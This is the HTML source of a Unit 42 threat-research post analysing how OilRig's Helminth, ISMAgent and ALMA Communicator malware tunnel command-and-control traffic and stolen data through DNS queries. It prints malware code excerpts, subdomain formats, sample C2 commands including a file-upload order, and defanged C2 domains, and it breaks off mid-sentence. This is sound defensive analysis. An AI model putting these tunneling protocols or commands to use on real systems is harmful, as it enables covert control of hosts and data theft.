
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>DNS Tunneling in the Wild: Overview of OilRig’s DNS Tunneling</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="On March 15, Unit 42 published a blog providing an overview of DNS tunneling and how malware can use DNS queries and answers to act as a command and control channel. To supplement this blog, we have decided to describe a collection of tools that rely on DNS tunneling used by an adversary known as OilRig."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="DNS Tunneling in the Wild: Overview of OilRig’s DNS Tunneling" />
<meta property="og:description" content="On March 15, Unit 42 published a blog providing an overview of DNS tunneling and how malware can use DNS queries and answers to act as a command and control channel. To supplement this blog, we have decided to describe a collection of tools that rely on DNS tunneling used by an adversary known as OilRig." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="ALMA Communicator" />
<meta property="article:tag" content="BONDUPDATER" />
<meta property="article:tag" content="dns tunneling" />
<meta property="article:tag" content="Helminth" />
<meta property="article:tag" content="ISMAgent" />
<meta property="article:tag" content="OilRig" />
<meta property="article:tag" content="QUADAGENT" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2019-04-16T16:00:12+00:00" />
<meta property="article:modified_time" content="2019-04-16T21:25:48+00:00" />
<meta property="og:updated_time" content="2019-04-16T21:25:48+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="On March 15, Unit 42 published a blog providing an overview of DNS tunneling and how malware can use DNS queries and answers to act as a command and control channel. To supplement this blog, we have decided to describe a collection of tools that rely on DNS tunneling used by an adversary known as OilRig." />
<meta name="twitter:title" content="DNS Tunneling in the Wild: Overview of OilRig’s DNS Tunneling" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; DNS Tunneling in the Wild: Overview of OilRig’s DNS Tunneling Comments Feed" href="https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/feed/" />
<meta property="og:likes" content="5"/>
<meta property="og:readtime" content="37"/>
<meta property="og:views" content="43,415"/>
<meta property="og:date_created" content="April 16, 2019 at 9:00 AM"/>
<meta property="og:post_length" content="10857"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"DNS Tunneling in the Wild: Overview of OilRig\u2019s DNS Tunneling","name":"DNS Tunneling in the Wild: Overview of OilRig\u2019s DNS Tunneling","description":"On March 15, Unit 42 published a blog providing an overview of DNS tunneling and how malware can use DNS queries and answers to act as a command and control channel. To supplement this blog, we have decided to describe a collection of tools that rely on DNS tunneling used by an adversary known as OilRig.","url":"https:\/\/unit42.paloaltonetworks.com\/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling\/","datePublished":"April 16, 2019","articleBody":"On March 15, Unit 42 published a blog providing an overview of DNS tunneling and how malware can use DNS queries and answers to act as a command and control channel. To supplement this blog, we have decided to describe a collection of tools that rely on DNS tunneling used by an adversary known as OilRig.\r\n\r\nUnit 42 has been tracking the OilRig threat group since early 2016, which has resulted in over a dozen blogs describing various attacks carried out by this adversary. We have been covering the various tools OilRig uses in their operations, many of which rely on DNS tunneling to communicate between infected hosts and their command and control (C2) server. The repeated use of DNS tunneling clearly represents one of their preferred communication methods; therefore, we chose to publish an overview of OilRig\u2019s tools that use various DNS tunneling protocols. A high-level analysis of the tunneling protocols used by these tools suggests:\r\n\r\n \tAll subdomains contain a randomly generated value to avoid the DNS query resulting in a cached response\r\n \tMost rely on an initial handshake to obtain a unique system identifier\r\n \tMost rely on hardcoded IP addresses within the DNS answers to start and stop data transfer\r\n \tData upload includes a sequence number that allows the C2 to reconstruct the uploaded data in the correct order\r\n \tDepending on the tool, A, AAAA, and TXT query types have been used by OilRig for tunneling\r\n \tAll of the DNS tunneling protocols will generate a significant number of DNS queries\r\n\r\nThis blog will dive deep into the DNS tunneling protocols used by OilRig\u2019s tools Helminth, ISMAgent, ALMACommunicator, BONDUPDATER, and QUADAGENT. Each of these tools use DNS queries and the answers to these queries to communicate back and forth with its C2 server. Not only will this blog discuss the structure of the queries and the responses, but it will also show these protocols in action with screenshots of Wireshark displaying how the tunnels would look within a packet capture.\r\nTool Overview\r\nOilRig delivered Trojans that use DNS tunneling for command and control in attacks since at least May 2016. Since May 2016, the threat group has introduced new tools using different tunneling protocols to their tool set. Figure 1 shows a timeline of when OilRig first used each of the 5 tools and their sub-variants in attacks, based on our visibility.\r\nFigure 1. Timeline of OilRig introducing DNS tunneling tools\r\nRegardless of the tool, all of the DNS tunneling protocols use DNS queries to resolve specially crafted subdomains to transmit data to the C2 and the answers to these queries to receive data from the C2. Therefore, the protocols must abide by the DNS protocol, so the specially crafted subdomains must have labels (portions of the subdomain separated by periods) must start and end with a letter or digit, contain letters, digits and hyphens and be less than 63 characters in length. Also, the entire domain queried, which includes the C2 domain and the specially crafted subdomain cannot exceed 253 characters.\r\n\r\nThe protocol used by each of the five tools to communicate with its C2 via DNS tunneling differ in many ways. First, the structure of the subdomains queried that the tools use to transmit information to the C2 differ. Next, the structure of the data received by the Trojans from the C2 in the answers to the DNS queries differ as well. The structure of the subdomains used to transmit data differ dramatically, both in the amount of data included and the encoding used to represent the data. The two encoding methods used by these tools to transmit data within the subdomains included base16 and base64 encoded data. The encoding method greatly impacts the amount of data the tool is able to transmit in the subdomain of each query, as base16 requires 2 ASCII characters to represent each byte of data, so each character byte within the subdomain can transmit half (.5) a byte of data. Compare this with the use of base64 to encode the data, in which each character of base64 encoded data in the subdomain represents 6-bits (.75 bytes) of the data. This makes the base64 encoding more effective from a transmission throughput perspective.\r\n\r\nThe DNS query type used by the Trojan for its tunnel greatly effects the amount of data that the C2 can transmit to the Trojan for each query. For instance, the tools that issue DNS A queries transmit data via IPv4 addresses within the answers, so the C2 is only able to transmit 4-bytes per query, whereas tools using AAAA queries can transmit 16-bytes within the IPv6 answer. Table 1 shows the tools and their variants covered in this blog with a focus on the number of bytes of data the C2 can provide per query, the amount of characters used in the specially crafted subdomain, the corresponding amount of data bytes sent per query and the encoding format used to transmit the data. The table below shows that QUADAGENT can transmit the most amount of data per query, as it has 60 characters within its subdomain to transmit base64 encoded data, meaning each query can transmit 45 (60*.75 = 45) bytes of data. The table also shows that the updated version of BONDUPDATER can download the most amount of bytes per query, as the C2 can provide 186.75 bytes of data thanks to the 255-byte maximum size for TXT queries and the C2 providing base64 encoded data after a 6 character sequence number ((255-6)*.75 = 186.75), which will be discussed later in this blog.\r\n\r\n\r\n\r\nTool\r\nBytes received per query\r\nCharacters for data per query\r\nData bytes sent per query \r\nData encoding in subdomain\r\n\r\n\r\nHelminth\r\n4\r\n48\r\n24\r\nBase16\r\n\r\n\r\nISMAGENT\r\n16\r\n13\r\n9.75\r\nBase64\r\n\r\n\r\nALMA\r\n\r\nCommunicator\r\nDash\r\n4\r\n20\r\n10\r\nBase16\r\n\r\n\r\nDot\r\n4\r\n60\r\n30\r\n\r\n\r\nBONDUPDATER\r\nOriginal\r\n3\r\n50\r\n25\r\nBase16\r\n\r\n\r\nUpdated\r\n186.75\r\n60\r\n30\r\n\r\n\r\nQUADAGENT\r\n16\r\n60\r\n45\r\nBase64\r\n\r\n\r\n\r\nTable 1. Throughput and encoding used by OilRig's tools using DNS tunneling\r\nAnother difference seen amongst the tools involves the type of DNS queries used to transmit and receive data, with each of the tools using DNS A, AAAA or TXT queries. Lastly, how the Trojan issues DNS queries differs as well. Depending on the tool, DNS queries could be issued using the built-in \u2018nslookup\u2019 application, using methods within the \u201cUdpClient\u201d class, using methods \u201cGetHostByName\u201d and \u201cGetHostAddresses\u201d from the \u2018DNS\u2019 class, or using the DnsQuery API functions within the \u2018Dnsapi\u2019 library. \u00a0Table 2 includes the five tools covered in this blog, which shows several different DNS query types used for the tunneling protocol and different functions used by the tools to issue the DNS requests. Also, the example C2 domain column provides the domain name once used by OilRig to host a C2 server for the associated tool.\r\n\r\n\r\n\r\nTool\r\nDNS Type\r\nDNS Query method\r\nExample C2 domain\r\n\r\n\r\nHelminth\r\nA\r\n[System.Net.DNS]::GetHostByName\r\ngo0gie[.]com\r\n\r\n\r\nISMAgent\r\nAAAA\r\nDnsQuery_A\r\nntpupdateserver[.]com\r\n\r\n\r\nALMACommunicator\r\nA\r\nDnsQuery_W\r\nprosalar[.]com\r\n\r\n\r\nBONDUPDATER\r\nA, TXT\r\n[System.Net.Dns]::GetHostAddresses, System.Net.Sockets.UdpClient\r\npoison-frog[.]club, withyourface[.]com\r\n\r\n\r\nQUADAGENT\r\nAAAA\r\nnslookup.exe, Resolve-DnsName\r\nacrobatverify[.]com\r\n\r\n\r\n\r\nTable 2. DNS type and query method used by OilRig's tools using DNS tunneling for C2\r\nIn the upcoming sections, we will provide an in-depth analysis of the DNS tunneling protocols used by each of OilRig\u2019s tools.\r\nHelminth\r\nThere are several variants of Helminth, as the OilRig actors actively developed this Trojan during the course of their attack campaigns. The Helminth Trojan came in two forms, a portable executable version and a PowerShell version, both of which received updates to their DNS tunneling protocol over time. The DNS tunneling protocols used in each variant operated the same way, but the developer would make changes to the generated subdomains to make them look visually different to evade detection.\r\n\r\nFor instance, Figures 2, 3 and 4 below show the subdomain generation function used in three variants of PowerShell Helminth, which effectively generate the subdomains with the same structure, but the first two characters differ from \u201c00\u201d, \u201czz\u201d and \u201cww\u201d. While the portable executable and PowerShell variants of Helminth generate different subdomains for their DNS tunneling, in this section we will focus on the PowerShell variant as it is easier to visualize.\r\nfunction GetSub($myflag2, $cmdid='00', $partid='000')\r\n\r\n{\r\n\r\nif($myflag2 -eq 0)\r\n\r\n{\r\n\r\n('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\r\n\r\n}\r\n\r\nelseif($myflag2 -eq 1)\r\n\r\n{\r\n\r\n('00'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))\r\n\r\n}\r\n\r\nelseif($myflag2 -eq 2)\r\n\r\n{\r\n\r\n('00'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))\r\n\r\n}\r\n\r\n}\r\nFigure 2. Code in Helminth \"00\" variant used to generate subdomains\r\n\r\nfunction GetSub($myflag3, $cmdid='00', $partid='000')\r\n\r\n{\r\n\r\nif($myflag3 -eq 0)\r\n\r\n{\r\n\r\n('ww000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\r\n\r\n}\r\n\r\nelseif($myflag3 -eq 1)\r\n\r\n{\r\n\r\n('ww'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))\r\n\r\n}\r\n\r\nelseif($myflag3 -eq 2)\r\n\r\n{\r\n\r\n('ww'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))\r\n\r\n}\r\n\r\n}\r\nFigure 3. Code in Helminth \"zz\" variant used to generate subdomains\r\n\r\nfunction GetSub($myflag2, $cmdid='00', $partid='000')\r\n\r\n{\r\n\r\nif($myflag2 -eq 0)\r\n\r\n{\r\n\r\n('zz000000'+(convertTo-Base36(Get-Random -Maximum 46655)));\r\n\r\n}\r\n\r\nelseif($myflag2 -eq 1)\r\n\r\n{\r\n\r\n('zz'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)));\r\n\r\n}\r\n\r\nelseif($myflag2 -eq 2)\r\n\r\n{\r\n\r\n('zz'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)));\r\n\r\n}\r\n\r\n}\r\nFigure 4. Code in Helminth \"ww\" variant used to generate subdomains\r\nThe Helminth variant that uses \u201c00\u201d as the first characters of generated subdomains is the first variant of this Trojan that we analyzed from an attack campaign on Saudi Arabian targets back in May 2016. During the explanation of the DNS tunneling, the \u201c00\u201d variant will be the main focus, but as the figures above suggest, the \u201cww\u201d and \u201czz\u201d variants are exactly the same just using different characters for the first two bytes of the subdomain.\r\n\r\nThe Helminth variant relies on DNS Type A requests to resolve custom crafted subdomains at the C2 domain to obtain IPv4 answers that it will ultimately parse and treat as data. It issues these DNS queries using the GetHostByName method in the System.Net.DNS class. The Helminth tool will use the downloaded data to create a batch script that it will run and upload the results to the C2 via the DNS tunnel. To carry out this activity, the Helminth tool looks for two hardcoded IP addresses within the response to its initial DNS query.\r\n\r\n\r\n\r\nIP Address\r\nDescription\r\n\r\n\r\n33.33.x.x\r\nProvides script filename and instructs the Trojan to start downloading data to save to the batch script.\r\n\r\n\r\n35.35.35.35\r\nInstructs the Trojan to stop downloading data and to execute the downloaded batch script.\r\n\r\n\r\n\r\nTable 3. IPv4 addresses used by Helminth for data transfer through the DNS tunnel\r\nThe Helminth Trojan initiates the conversation with its C2 server by issuing a DNS query to resolve a special subdomain that acts as a beacon. The C2 will respond to this beacon with an IPv4 address in the DNS answer that the Trojan will use to obtain a unique system identifier from the C2, specifically converting the number in the first octet of the IPv4 to a character and using this character to uniquely identify the system in subsequent DNS queries. The initial beacon to obtain a system identifier from the C2 has the following structure:\r\n\r\n00000000&lt;base36 encoded random number less than 46655&gt;&lt;sequence number \u201c30\u201d&gt;.&lt;c2 domain&gt;\r\n\r\nFigure 5 shows this initial beacon that includes the hardcoded string of eight zeros (\u201c00000000\u201d), followed by three characters for the base36 encoded random number and a sequence number of \u201c30\u201d, which represents the character \u201c0\u201d. Figure 5 also shows the C2 server providing an IPv4 address of \u201c35.0.0.0\u201d as the answer to the DNS request. This IP address instructs the Trojan use the character \u201c5\u201d as a unique system identifier, as the number 35 represents the \u201c5\u201d character in ASCII. The Trojan will use this identifier in subsequent queries that the C2 server will use to identify the system.\r\n\r\n\r\nFigure 5 Initial beacon from Helminth and the C2 replying with a unique system identifier\r\nThe next query includes the system identifier provided by the C2 as the third character in the subdomain, followed by the base36 encoded random number and the sequence number \u201c30\u201d, which represents the character \u201c0\u201d. This query has the following structure, which reuses the \u201c30\u201d sequence number as the Trojan has not begun receiving data yet:\r\n\r\n00&lt;system identifier&gt;00000&lt;base36 encoded random number less than 46655&gt;&lt;sequence number \u201c30\u201d&gt;.&lt;c2 domain&gt;\r\n\r\nThe C2 will respond to this query with an answer that contains an IPv4 address that is structured as \u201c33.33.x.x\u201d, which Helminth will treat the last two octets as integers (\u201cx.x\u201d) and converts them to characters to use as the name of the batch file used to store the downloaded script. Helminth will concatenate the \u201c.bat\u201d file extension to these two characters to create the batch script and will begin issuing additional DNS queries and treat future IPv4 addresses in responses as data that it will write to this file. Figure 6 shows the query containing the system identifier and the C2 responding with an IPv4 answer of \u201c33.33.97.97\u201d, which Helminth will use \u201c97.97\u201d to create a file named \u201caa.bat\u201d, as the number 97 represents the \u201ca\u201d character in ASCII.\r\n\r\n\r\nFigure 6. C2 providing Helminth with the two character filename\r\nTo download data from the C2, Helminth will issue DNS queries that have the following structure, which is similar to the previous query used to obtain the filename, however, these requests include a hardcoded string \u201c232A\u201d followed by the hexadecimal representation of the two characters used for the filename:\r\n\r\n00&lt;system identifier&gt;00000&lt;base 36 encoded random number less than 46655&gt;232A&lt;hexlified characters for filename&gt;&lt;sequence number&gt;.&lt;c2 domain&gt;\r\n\r\nThe C2 server will begin providing IPv4 addresses that the Trojan will treat each octet as the base10 representation of the binary data. The Trojan will write each byte to the batch file and continue to do so until the C2 provides the IPv4 address of \u201c35.35.35[.]35\u201d as a DNS answer, which instructs the Trojan to stop writing data to the file and run the file as a batch script.\r\n\r\nFigure 7 shows the C2 server providing the \u201c33.33.97[.]97\u201d IPv4 address instructing the Trojan to create a file name \u201caa.bat\u201d. The screenshot then shows the Trojan issuing DNS queries with incrementing sequence numbers (\u201c31\u201d, \u201c32\u201d and \u201c33\u201d for 1, 2 and 3), which the C2 is responding with two IPv4 addresses to transmit the data (119.104.111[.]97 and 109.105.32[.]32 to transmit the string \u201cwhoami\u201d) followed by the \u201c35.35.35[.]35\u201d address to end the data transmission.\r\n\r\n\r\nFigure 7. Helminth requesting data from the C2 server until receiving the IPv4 35.35.35[.]35 to stop the data transfer\r\nOnce it receives the \u201c35.35.35[.]35\u201d address, Helminth will run the downloaded batch script and save the output of the script to a text file whose name has the same two characters as the batch script. For instance, in the above example the Trojan would save the output of the \u201caa.bat\u201d script to \u201caa.txt\u201d. The Trojan will upload the contents of this text file to the C2 server via a series of DNS queries that have the following structure:\r\n\r\n00&lt;system identifier&gt;&lt;characters for filename&gt;&lt;sequence number&gt;&lt;base 36 encoded random number less than 46655&gt;&lt;up to 48 characters for a maximum of 24-bytes of hexlified data&gt;.&lt;c2 domain&gt;\r\n\r\nThe Trojan splits the contents of the text file up into 24-byte chunks and converts each byte into its hexadecimal representation. Helminth will include the hexadecimal representation of these bytes within the subdomain and will issue a DNS query to transmit the data to the C2 server. The Trojan will continue this process until all of the 24-byte chunks are sent to the C2, with each query including an incrementing sequence number. Helminth does nothing with the C2 server\u2019s answer to these queries, as it just makes sure the DNS server responded with any answer. Figure 8 shows the Helminth Trojan uploading the contents of the text file that contains the results of the batch script (\u201cwhoami\u201d command) to the C2 server in a series of five DNS queries.\r\n\r\n\r\nFigure 8. Helminth sending the results of the command within queried subdomains\r\n\r\nISMAgent\r\nOilRig has used the ISMAgent tool in targeted attacks, one of which we publicly discussed in our blog titled OilRig Uses ISMDoor Variant; Possibly Linked to Greenbug Threat Group. OilRig\u2019s use of this tool was an interesting discovery, as ISMAgent uses a DNS tunneling protocol very similar to another tool called ISMDoor that had been linked to another group called Greenbug. Researchers have already explained ISMDoor\u2019s tunneling protocol here, so we will focus on explaining ISMAgent\u2019s DNS tunneling protocol.\r\n\r\nISMAgent uses the DnsQuery_A API function to issue DNS AAAA requests to resolve custom crafted subdomains at an actor owned domain to send data to and receive commands from OilRig. The Trojan will initiate data transfer by issuing a beacon that contains a unique session identifier generated by calling the CoCreateGuid API function and using the resulting GUID with its hyphens removed. ISMAgent then uses this session identifier within a subdomain with the following structure that it will attempt to resolve:\r\n\r\nn.n.c.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;\r\n\r\nISMAgent performs an AAAA query to resolve the domain, which effectively notifies the C2 that it is about to send data. If the C2 is operational, it will respond to this beacon with an IPv6 address of \u2018a67d:0db8:a2a1:7334:7654:4325:0370:2aa3\u2019 to acknowledge that it received the beacon and is ready to handle the data ISMAgent will attempt to send it. After receiving the acknowledgment IPv6 from the C2 server, the Trojan build a string that has the following structure:\r\n\r\nhttp:\/\/&lt;IP of C2 domain&gt;\/action2\/&lt;base64 encoded computername\\username&gt;||\r\n\r\nISMAgent will base64 encode the string above (converting \u201c=\u201d, \u201c\/\u201d and \u201c+\u201d to \u201c-\u201c, \u201c-s-\u201c and \u201c-p-\u201c respectively) and then sends the encoded data to the C2 in a series DNS queries to resolve domains that have the following structure:\r\n\r\n&lt;up to 13 characters of base64 encoded data&gt;.&lt;iterating sequence number&gt;.d.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;\r\n\r\nThe C2 will respond with a hardcoded IPv6 of \u201ca67d:0db8:85a3:4325:7654:8a2a:0370:7334\u201d to tell the Trojan that it received the data and to continue sending data. Once it has sent all the data to the C2 server, ISMAgent will issue a query to resolve a domain with the following structure to notify the C2 server it is done sending data:\r\n\r\nn.&lt;number of queries issued to send data&gt;.f.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;\r\n\r\nFigure 9 shows Wireshark displaying the ISMAgent beacon followed by the Trojan sending data to the C2 server. Figure 9 also shows that the C2 uses very specific IPv6 addresses as answers to the queries, specifically including the IPv6 addresses used for acknowledgement and to instruct the Trojan to continue sending data. Lastly, the screenshot shows a third IPv6 used to answer the last DNS query, which the Trojan will use to determine how many DNS requests it needs to issue to download data from the C2.\r\n\r\n\r\nFigure 9. ISMAgent's initial beacon followed by the transfer of system data \u201caction2\u201d in the queried subdomains\r\nFigure 9 showed the C2 server providing an IPv6 address as an answer to the query that ISMAgent issued to mark the completion of data transfer. ISMAgent will parse this IPv6 to make sure it starts with \u201ca67d:0db8:85a3:4325:7654\u201d and then uses the last two hexadectets as a number of DNS queries it should issue to download data from the C2 server. The Trojan will issue queries to resolve domains with the following structure and treats the IPv6 addresses in the answers as data:\r\n\r\nwww.&lt;sequence number [0:count from C2 server-1]&gt;.r.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;\r\n\r\nFigure 10 shows the C2 server responding to a query with an IPv6 address that begins with \u201ca67d:0db8:85a3:4325:7654\u201d and ends with 11, which instructs ISMAgent to issue 11 DNS queries to download data. The screenshot then shows ISMAgent issuing 11 DNS requests that the C2 server responds with data structured as follows:\r\n\r\n&lt;GUID used as a unique system identifier&gt;#command#&lt;URL to download a file&gt;#&lt;command to run with cmd.exe&gt;#&lt;file to upload to c2&gt;#\r\n\r\nIn Figure 10, the C2 provided IPv6 addresses that transmitted the following data to the ISMAgent Trojan, which would run a PowerShell script that writes text to a file \u201cC:\\Users\\Public\\file.txt:\r\n\r\n2983b983-0acd-42db-9d86-0b096af5f369#command##powershell.exe -executionpolicy bypass \\\"$s = 'Text written to file.txt';$s | set-content 'c:\\\\Users\\\\Public\\\\file.txt'\\\"#\r\n\r\n\r\nFigure 10. ISMAgent downloading data from the C2 within IPv6 answers that the Trojan will treat as a command\r\nThe next beacon sent by ISMAgent follows the same process as the initial beacon, including the query to resolve \u201cn.n.c\u201d followed by the data transfer requests with the base64 encoded data in the subdomain and finishing with the \u201cn.&lt;requests sent&gt;.f\u201d query. The data transferred differs from the initial beacon, as it includes the GUID provided by the C2 in the previous beacon and the URL contains the word \u201cresponse\u201d instead of \u201caction2\u201d. The data sent to the C2 has the following structure, which the word \u201cresponse\u201d notifies the C2 that it is responding the previous transmission of the GUID:\r\n\r\nhttp:\/\/&lt;IP of c2 domain&gt;\/response\/&lt;base64 encoded computername\\username&gt;\/&lt;GUID provided by C2 as a unique system identifier&gt;||\r\n\r\nFigure 11 shows the DNS requests that ISMAgent issues to send this data to the C2 server. As you can see from the query to resolve the \u201cn.12.f.\u201d subdomain, ISMAgent sent 12 queries to transmit the encoded data to the C2 server via the DNS tunnel.\r\n\r\n\r\nFigure 11. ISMAgent sending data \u201cresponse\u201d to the C2 server within queried subdomains\r\nTo show how ISMAgent exfiltrates data from the system, we issued the following command from the C2 server:\r\n\r\n2983b983-0acd-42db-9d86-0b096af5f369#command###C:\\\\Users\\\\Public\\\\file.txt\r\n\r\nThe C2 issues this command within IPv6 addresses provided as answers to five queries seen in Figure 12. The command instructs ISMAgent to read the \u201cC:\\Users\\Public\\file.txt\u201d file and upload its contents to the C2 server. If you recall, the string \u201cText written to file.txt\u201d was written to this file from the PowerShell script executed by the initial command issued by the C2 server in Figure 11 above.\r\n\r\n\r\nFigure 12. ISMAgent downloading data from the C2 within IPv6 addresses\r\nISMAgent will read the file and send its contents to the C2 server via the same sequence of DNS queries as before. The following shows the structure of the data uploaded, which is similar to but differs from previous data transferred, specifically including the string \u201cupload\u201d in the URL and the contents of the uploaded file following the double pipe (\u201c||\u201d) characters.\r\n\r\nhttp:\/\/&lt;IP of c2 domain&gt;\/upload\/&lt;base64 encoded computername\\username&gt;\/&lt;GUID provided by C2 as a unique system identifier&gt;||&lt;contents of file uploaded&gt;\r\n\r\nFigure 13 shows ISMAgent uploading the contents of the \u201cfile.txt\u201d file by sending the following data in encoded form to the C2 in 15 DNS queries:\r\n\r\nhttp:\/\/172.16.107[.]128\/upload\/V0lOLURQUUNPTkJMMU44XFJpY2sgRW5nbGlzaA%3d%3d\/2983b983-0acd-42db-9d86-0b096af5f369||Text written to file.txt\\r\\n\r\n\r\n\r\nFigure 13. ISMAgent uploading data to the C2 via the queried subdomains\r\n\r\nALMA Communicator\r\nWhile tracking OilRig, we observed the threat group delivering two different variants of a tool called ALMA communicator as a payload. The two variants use DNS tunneling as its C2 channel, but the structure of the domains generated differ enough to describe them separately.\r\nALMA dash\r\nThe dash variant of ALMA was the first ALMA Communicator variant we discovered and was the focal point of our blog titled OilRig Deploys \u201cALMA Communicator\u201d \u2013 DNS Tunneling Trojan. Like other tools used by OilRig, ALMA uses two separate folders named \u201cDownload\u201d and \u201cUpload\u201d to store files that it receives from the C2 and to store files that it will exfiltrate to the C2. The ALMA dash tool will use a custom DNS tunneling protocol to download files provided by the C2 server and save these files in the \u201cDownload\u201d folder. ALMA dash will routinely check the contents of the second folder named \u201cUpload\u201d and use the custom DNS tunneling protocol to exfiltrate the contents of each file in this folder.\r\n\r\nALMA dash\u2019s custom DNS tunneling protocol relies on DNS A record queries to resolve custom crafted subdomains at the actor controlled C2 domain. ALMA dash builds the subdomains and uses the DnsQuery_W function to issue these DNS queries. OilRig transmits data via IPv4 addresses within the answers to these queries, which ALMA will save to the \u201cDownload\u201d folder and execute using CreateProcessA with the command line of \u201ccmd \/c &lt;downloaded file&gt;\u201d. The results of the command are saved to a file in the \u201cUpload\u201d folder that ALMA will exfiltrate to the C2 server.\r\n\r\nALMA dash generates a unique identifier for the system by gathering the user name and windows product key and combining the two strings together with an underscore (\u201c_\u201d) between them. The Trojan obtains the username via the GetUserNameA function and gathers the Windows product id by querying the registry, specifically the key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ ProductId. ALMA will then generate the MD5 hash for this string and use characters at specific offsets (offsets 1, 5, 9, 13, 17, 21, 25 and 29) in this MD5 hash to create an 8-character string that it will use as the unique identifier for the system.\r\n\r\nWith the unique identifier created, ALMA dash initiates communications with the C2 server by sending a beacon to the C2 server using a DNS query to resolve a custom crafted subdomain at the actor-controlled C2 domain. ALMA issues these beacons to notify the C2 that it seeks to download data.\r\n\r\n[random number between 1-9998]ID[unique identifier from MD5 hash of system information][sequence number]-0-2D-2D.[C2 domain]\r\n\r\nFigure 14 shows the initial beacon sent from ALMA dash to its C2 server, including a random number of \u201c6813\u201d, a unique identifier of \u201c8faa2150\u201d, a sequence number of \u201c0\u201d and a hardcoded \u201c-0-2D-2D\" string used for the beacon.\r\n\r\n\r\nFigure 14. ALMA Communicator's initial beacon to the C2\r\nThe authoritative DNS server for the C2 domain will send data to ALMA dash within the IPv4 answers to the query. The DNS server will use a hardcoded IPv4 address of 36.37.94[.]33 ($%^!)within answer to instruct the Trojan to begin treating all future IPv4 addresses within answers as data. To obtain the entire data stream, ALMA dash will continue to issue queries to resolve subdomains using the format above; however, ALMA will generate a new random number each query to avoid caching. ALMA dash will continue to send queries until it receives the IPv4 address of 33.33.94[.]94 (!!^^), which the C2 server will send when it is finished sending data. Figure 15 shows the C2 server answering the ALMA beacon with an IPv4 address of \u201c36.37.94[.]33\u201d to tell the Trojan to begin treating subsequent IPv4 as data.\r\n\r\n\r\nFigure 15. C2 server responds to ALMA's beacon with data in the IPv4 answers\r\nThe Trojan will continue to treat the IPv4 addresses within the DNS query responses as data until the C2 server responds with the address of \u201c33.33.94[.]94\u201d. Figure 16 shows the C2 server providing data in the form of IPv4 addresses until it the \u201c33.33.94[.]94\u201d address to terminate the data transfer.\r\n\r\n\r\nFigure 16. ALMA continues to issue queries to download data from the C2 until it receives the 33.33.94[.]94 IPv4 address\r\nTo exfiltrate data from the system to the C2 server, ALMA dash variants will read the contents of the files in the \u201cUploads\u201d folder and send their contents to the C2 via a series of DNS queries. The DNS queries have a similar structure as the initial beacon, as these requests will start with a random number, the string \u201cID\u201d and the unique identifier created based on the MD5 hash generated for the system information gathered by the Trojan. The differences include the hardcoded string of 